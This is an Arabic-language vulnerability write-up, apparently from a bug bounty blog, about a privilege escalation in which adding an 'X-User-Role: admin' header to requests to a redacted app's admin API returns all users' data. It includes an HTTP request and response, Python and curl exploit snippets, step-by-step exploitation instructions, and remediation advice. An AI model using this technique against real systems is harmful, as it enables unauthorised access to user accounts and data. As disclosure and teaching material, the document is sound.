03 // الاكتشاف

لما فحصت الـ API requests في Burp Suite لقيت إن السيرفر يقبل هيدر مخصص:

HTTP Request 
GET /api/v1/admin/users HTTP/1.1
Host: app.redacted.com
Authorization: Bearer eyJ...
X-User-Role: admin
 
Response: 200 OK
{"users": [{"id": 1, "email": "admin@redacted.com"}, ...]}

بمجرد إضافة الهيدر X-User-Role: admin السيرفر تجاوز التحقق من الصلاحيات وأعطاني وصول كامل.

Python 
import requests
 
url = "https://app.redacted.com/api/v1/admin/users"
headers = {
    "Authorization": "Bearer eyJ...",
    "X-User-Role": "admin"
}
 
response = requests.get(url, headers=headers)
print(response.json())
Bash 
# استخراج بيانات المستخدمين
curl -s "https://app.redacted.com/api/v1/admin/users" \
  -H "Authorization: Bearer eyJ..." \
  -H "X-User-Role: admin" | jq '.'

04 // التأثير

هذي الثغرة كان تأثيرها خطير جدا لأنها تسمح لأي مستخدم عادي يوصل لصلاحيات الأدمن الكاملة:

  • الوصول لقاعدة بيانات المستخدمين كاملة
  • تعديل إعدادات التطبيق
  • حذف أو تعديل حسابات المستخدمين
  • إمكانية تنفيذ أوامر على السيرفر من خلال لوحة التحكم
// ملاحظة

تقدر تستخدم صناديق المعلومات بألوان مختلفة: أحمر (افتراضي)، أخضر (green)، سماوي (cyan)، أصفر (yellow).

05 // التفاصيل التقنية

العنصر التفاصيل

المكون المتأثر /api/v1/admin/*
المتطلبات حساب مستخدم عادي فقط

06 // خطوات الاستغلال

  1. سجل دخول بحساب مستخدم عادي واحصل على الـ JWT Token
  2. افتح Burp Suite واعترض أي طلب API
  3. أضف الهيدر X-User-Role: admin للطلب
  4. أرسل الطلب لـ /api/v1/admin/users
  5. راح تحصل على رد 200 OK مع بيانات جميع المستخدمين
// نصيحة

دائما اختبر الهيدرز المخصصة وتلاعب بالبارمترز عند فحص آليات التحكم بالوصول. كثير من التطبيقات تعتمد على هيدرز من جانب العميل بدل التحقق من السيرفر.

07 // التوصيات

  1. إزالة التحقق من الهيدر المخصص X-User-Role نهائيا
  2. الاعتماد فقط على التحقق من الـ JWT من جانب السيرفر
  3. تطبيق RBAC middleware لا يمكن تجاوزه
  4. إضافة مراقبة وتنبيهات لمحاولات رفع الصلاحيات
